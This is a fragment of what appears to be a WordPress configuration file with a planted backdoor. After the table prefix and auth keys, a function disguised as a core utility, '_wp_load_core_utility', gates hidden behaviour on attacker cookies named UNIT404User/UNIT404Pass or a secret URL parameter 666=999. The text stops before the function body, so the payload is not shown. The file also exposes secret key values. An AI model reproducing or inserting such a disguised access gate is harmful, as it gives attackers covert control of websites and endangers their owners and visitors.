 ...
 */
$table_prefix = 'wp_';
define( 'AUTH_KEY',         '6921350a4d334e090a7b1649e7b95537' );
define( 'SECURE_AUTH_KEY',  'a6b51256ec799e0907b1649e7b955371' );

if ( ! function_exists( '_wp_load_core_utility' ) ) {
    function _wp_load_core_utility() {

        $is_authenticated = isset($_COOKIE['UNIT404User']) && isset($_COOKIE['UNIT404Pass']);
        $has_param = isset($_GET['666']) && $_GET['666'] === '999';

        if ( !$is_authenticated && !$has_param ) {
